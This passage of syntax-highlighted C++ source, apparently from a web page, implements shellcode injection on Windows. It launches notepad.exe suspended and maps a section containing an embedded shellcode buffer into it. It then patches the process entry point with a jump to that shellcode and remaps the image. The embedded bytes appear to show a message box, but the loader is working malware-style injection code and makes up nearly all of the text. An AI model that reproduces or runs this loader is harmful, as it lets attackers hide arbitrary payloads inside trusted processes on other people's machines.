</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetEntryPoint</span>(BYTE<span style="color:#f92672">*</span> processImage)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    IMAGE_DOS_HEADER<span style="color:#f92672">*</span> dosHeader <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    IMAGE_NT_HEADERS<span style="color:#f92672">*</span> ntHeaders <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dosHeader <span style="color:#f92672">=</span> (IMAGE_DOS_HEADER<span style="color:#f92672">*</span>)processImage;
</span></span><span style="display:flex;"><span>    ntHeaders <span style="color:#f92672">=</span> (IMAGE_NT_HEADERS<span style="color:#f92672">*</span>)((BYTE<span style="color:#f92672">*</span>)processImage <span style="color:#f92672">+</span> dosHeader<span style="color:#f92672">-&gt;</span>e_lfanew);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (ntHeaders<span style="color:#f92672">-&gt;</span>OptionalHeader.AddressOfEntryPoint);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PVOID <span style="color:#a6e22e">PatchHostProcess</span>(HOST<span style="color:#f92672">*</span> hostProcess, PVOID shellcodeAddress)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// read enough bytes to get the size of image
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    SIZE_T bytesRead <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    BYTE<span style="color:#f92672">*</span> imageData <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span>(BYTE[SECTION_SIZE]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// both calls read the same chunk of same size because this readprocessmemory fails we change the size 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ReadProcessMemory(
</span></span><span style="display:flex;"><span>        hostProcess<span style="color:#f92672">-&gt;</span>processHandle, 
</span></span><span style="display:flex;"><span>        (LPCVOID)hostProcess<span style="color:#f92672">-&gt;</span>imageBaseAddress, 
</span></span><span style="display:flex;"><span>        imageData,
</span></span><span style="display:flex;"><span>        SECTION_SIZE, 
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>bytesRead) <span style="color:#f92672">&amp;&amp;</span> bytesRead <span style="color:#f92672">!=</span> SECTION_SIZE)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] failed to read process image headers&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    DWORD sizeOfImage <span style="color:#f92672">=</span> GetSizeOfImage(imageData);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">delete</span>[] imageData;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    BYTE<span style="color:#f92672">*</span> processImage <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span>(BYTE[sizeOfImage]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ReadProcessMemory(
</span></span><span style="display:flex;"><span>        hostProcess<span style="color:#f92672">-&gt;</span>processHandle, 
</span></span><span style="display:flex;"><span>        (LPCVOID)hostProcess<span style="color:#f92672">-&gt;</span>imageBaseAddress, 
</span></span><span style="display:flex;"><span>        processImage,
</span></span><span style="display:flex;"><span>        sizeOfImage, 
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>bytesRead) <span style="color:#f92672">&amp;&amp;</span> bytesRead <span style="color:#f92672">!=</span> sizeOfImage)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] failed to read process image&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    DWORD entryPoint <span style="color:#f92672">=</span> GetEntryPoint(processImage);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!]Original entry point : 0x&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>hex <span style="color:#f92672">&lt;&lt;</span> hostProcess<span style="color:#f92672">-&gt;</span>imageBaseAddress <span style="color:#f92672">+</span> entryPoint <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    memset(processImage <span style="color:#f92672">+</span> entryPoint, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">5</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    DWORD processEntry <span style="color:#f92672">=</span> hostProcess<span style="color:#f92672">-&gt;</span>imageBaseAddress <span style="color:#f92672">+</span> entryPoint;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    DWORD relativeAddr <span style="color:#f92672">=</span> (((DWORD)shellcodeAddress <span style="color:#f92672">-</span> processEntry) <span style="color:#f92672">-</span> <span style="color:#ae81ff">5</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((BYTE<span style="color:#f92672">*</span>)processImage <span style="color:#f92672">+</span> entryPoint) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xe9</span>; <span style="color:#75715e">// jmp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(uintptr_t<span style="color:#f92672">*</span>)((uintptr_t)processImage <span style="color:#f92672">+</span> entryPoint <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> relativeAddr; <span style="color:#75715e">// address
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    LARGE_INTEGER sectionSize <span style="color:#f92672">=</span> { sizeOfImage };
</span></span><span style="display:flex;"><span>    HANDLE sectionHandle <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    PVOID sectionAddress <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (fNtCreateSection(
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>sectionHandle, 
</span></span><span style="display:flex;"><span>        SECTION_ALL_ACCESS, 
</span></span><span style="display:flex;"><span>        NULL, 
</span></span><span style="display:flex;"><span>        (PLARGE_INTEGER)<span style="color:#f92672">&amp;</span>sectionSize, 
</span></span><span style="display:flex;"><span>        PAGE_EXECUTE_READWRITE,
</span></span><span style="display:flex;"><span>        SEC_COMMIT, NULL) <span style="color:#f92672">!=</span> STATUS_SUCCESS)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] create section failed&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (fNtMapViewOfSection(
</span></span><span style="display:flex;"><span>        sectionHandle, 
</span></span><span style="display:flex;"><span>        GetCurrentProcess(), 
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>sectionAddress, 
</span></span><span style="display:flex;"><span>        NULL, NULL, NULL, 
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>bytesRead, <span style="color:#ae81ff">2</span>, NULL, 
</span></span><span style="display:flex;"><span>        PAGE_EXECUTE_READWRITE) <span style="color:#f92672">!=</span> STATUS_SUCCESS)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] create section failed&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!]replacing patched process image at 0x&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>hex <span style="color:#f92672">&lt;&lt;</span> hostProcess<span style="color:#f92672">-&gt;</span>imageBaseAddress <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    memcpy(sectionAddress, processImage, sizeOfImage);
</span></span><span style="display:flex;"><span>    sectionAddress <span style="color:#f92672">=</span> (PVOID)hostProcess<span style="color:#f92672">-&gt;</span>imageBaseAddress;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (fZwUnmapViewOfSection(
</span></span><span style="display:flex;"><span>        hostProcess<span style="color:#f92672">-&gt;</span>processHandle, 
</span></span><span style="display:flex;"><span>        sectionAddress) <span style="color:#f92672">!=</span> STATUS_SUCCESS)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] unmapping failed&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (fNtMapViewOfSection(
</span></span><span style="display:flex;"><span>        sectionHandle, 
</span></span><span style="display:flex;"><span>        hostProcess<span style="color:#f92672">-&gt;</span>processHandle, 
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>sectionAddress, 
</span></span><span style="display:flex;"><span>        NULL, NULL, NULL,
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>bytesRead, 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">2</span>, NULL, 
</span></span><span style="display:flex;"><span>        PAGE_EXECUTE_READWRITE) <span style="color:#f92672">!=</span> STATUS_SUCCESS)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;create section failed&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    CloseHandle(sectionHandle);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">delete</span>[] processImage;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (PVOID)processEntry;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PVOID <span style="color:#a6e22e">InjectShellcode</span>(HOST<span style="color:#f92672">*</span> hostProcess, SHELLCODE<span style="color:#f92672">*</span> s)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    LARGE_INTEGER sectionSize <span style="color:#f92672">=</span> { s<span style="color:#f92672">-&gt;</span>shellcodeSize };
</span></span><span style="display:flex;"><span>    HANDLE sectionHandle <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    PVOID localSectionAddress <span style="color:#f92672">=</span> NULL, remoteSectionAddress <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// create a read write execute memory region in the local process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (fNtCreateSection(
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>sectionHandle, 
</span></span><span style="display:flex;"><span>        SECTION_MAP_READ <span style="color:#f92672">|</span> SECTION_MAP_WRITE <span style="color:#f92672">|</span> SECTION_MAP_EXECUTE, 
</span></span><span style="display:flex;"><span>        NULL,
</span></span><span style="display:flex;"><span>        (PLARGE_INTEGER)<span style="color:#f92672">&amp;</span>sectionSize, 
</span></span><span style="display:flex;"><span>        PAGE_EXECUTE_READWRITE, 
</span></span><span style="display:flex;"><span>        SEC_COMMIT, 
</span></span><span style="display:flex;"><span>        NULL) <span style="color:#f92672">!=</span> STATUS_SUCCESS)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[x]Create section failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// create a view of the memory section in the local process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (fNtMapViewOfSection(
</span></span><span style="display:flex;"><span>        sectionHandle, 
</span></span><span style="display:flex;"><span>        GetCurrentProcess(), 
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>localSectionAddress, 
</span></span><span style="display:flex;"><span>        NULL, NULL, NULL,
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>s<span style="color:#f92672">-&gt;</span>shellcodeSize, 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">2</span>, NULL, 
</span></span><span style="display:flex;"><span>        PAGE_READWRITE) <span style="color:#f92672">!=</span> STATUS_SUCCESS)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[x]Create map failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// create a map view of the section in the target process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (fNtMapViewOfSection(
</span></span><span style="display:flex;"><span>        sectionHandle, 
</span></span><span style="display:flex;"><span>        hostProcess<span style="color:#f92672">-&gt;</span>processHandle, 
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>remoteSectionAddress, 
</span></span><span style="display:flex;"><span>        NULL, NULL, NULL,
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>s<span style="color:#f92672">-&gt;</span>shellcodeSize, 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">2</span>, NULL, 
</span></span><span style="display:flex;"><span>        PAGE_EXECUTE_READ) <span style="color:#f92672">!=</span> STATUS_SUCCESS)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[x]Create map failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    memcpy(localSectionAddress, s<span style="color:#f92672">-&gt;</span>shellcode, s<span style="color:#f92672">-&gt;</span>shellcodeSize);
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!]Shellcode injected to 0x&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>hex <span style="color:#f92672">&lt;&lt;</span> (DWORD)remoteSectionAddress <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    CloseHandle(sectionHandle);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> remoteSectionAddress;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> buf[] <span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68\x6b\x74\x58\x20\x68\x74\x20\x72\x65\x68\x45\x3d\x67\x65</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68\x54\x49\x54\x4c\x68\x72\x65\x6b\x74\x68\x67\x65\x74\x20</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc9\x88\x4c\x24\x16\x89\xe1\x31\xd2\x52\x53\x51\x52\xff</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd0\x31\xc0\x50\xff\x55\x08</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    HOST<span style="color:#f92672">*</span> hostProcess <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HOST();
</span></span><span style="display:flex;"><span>    LPSTARTUPINFOA si <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> STARTUPINFOA();
</span></span><span style="display:flex;"><span>    LPPROCESS_INFORMATION pi <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PROCESS_INFORMATION();
</span></span><span style="display:flex;"><span>    PROCESS_BASIC_INFORMATION<span style="color:#f92672">*</span> pbi <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PROCESS_BASIC_INFORMATION();
</span></span><span style="display:flex;"><span>    DWORD returnLength <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    CONTEXT ctx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    SHELLCODE<span style="color:#f92672">*</span> s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SHELLCODE();
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">-&gt;</span>shellcode <span style="color:#f92672">=</span> buf;
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">-&gt;</span>shellcodeSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(buf);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (CreateProcessA(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">notepad.exe&#34;</span>, 
</span></span><span style="display:flex;"><span>        (LPSTR)<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">notepad.exe&#34;</span>,
</span></span><span style="display:flex;"><span>        NULL, NULL, TRUE, 
</span></span><span style="display:flex;"><span>        CREATE_SUSPENDED <span style="color:#f92672">|</span> CREATE_NO_WINDOW, 
</span></span><span style="display:flex;"><span>        NULL, NULL, si, pi) <span style="color:#f92672">==</span> FALSE)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[x]Failed to execute notepad.exe</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!]Executed notepad.exe</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    hostProcess<span style="color:#f92672">-&gt;</span>processHandle <span style="color:#f92672">=</span> pi<span style="color:#f92672">-&gt;</span>hProcess;
</span></span><span style="display:flex;"><span>    ctx.ContextFlags <span style="color:#f92672">=</span> CONTEXT_FULL;
</span></span><span style="display:flex;"><span>    fNtGetContextThread(pi<span style="color:#f92672">-&gt;</span>hThread, <span style="color:#f92672">&amp;</span>ctx);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    NtQueryInformationProcess(
</span></span><span style="display:flex;"><span>        hostProcess<span style="color:#f92672">-&gt;</span>processHandle, 
</span></span><span style="display:flex;"><span>        ProcessBasicInformation, 
</span></span><span style="display:flex;"><span>        pbi,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">sizeof</span>(PROCESS_BASIC_INFORMATION), 
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>returnLength);
</span></span><span style="display:flex;"><span>    DWORD pebImageBaseOffset <span style="color:#f92672">=</span> (DWORD)pbi<span style="color:#f92672">-&gt;</span>PebBaseAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    SIZE_T bytesRead <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ReadProcessMemory(
</span></span><span style="display:flex;"><span>        hostProcess<span style="color:#f92672">-&gt;</span>processHandle, 
</span></span><span style="display:flex;"><span>        (LPCVOID)pebImageBaseOffset, 
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>hostProcess<span style="color:#f92672">-&gt;</span>imageBaseAddress,
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">4</span>, <span style="color:#f92672">&amp;</span>bytesRead) <span style="color:#f92672">&amp;&amp;</span> bytesRead <span style="color:#f92672">!=</span> <span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;failed to read image base address&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    PVOID remoteShellcodeAddress <span style="color:#f92672">=</span> InjectShellcode(hostProcess, s);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (remoteShellcodeAddress <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;shellcode injection failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>; 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>   
</span></span><span style="display:flex;"><span>    PVOID addr <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((addr <span style="color:#f92672">=</span> PatchHostProcess(hostProcess, remoteShellcodeAddress)) <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;failed tp patch host</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    } 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    fNtSetContextThread(pi<span style="color:#f92672">-&gt;</span>hThread, <span style="color:#f92672">&amp;</span>ctx);
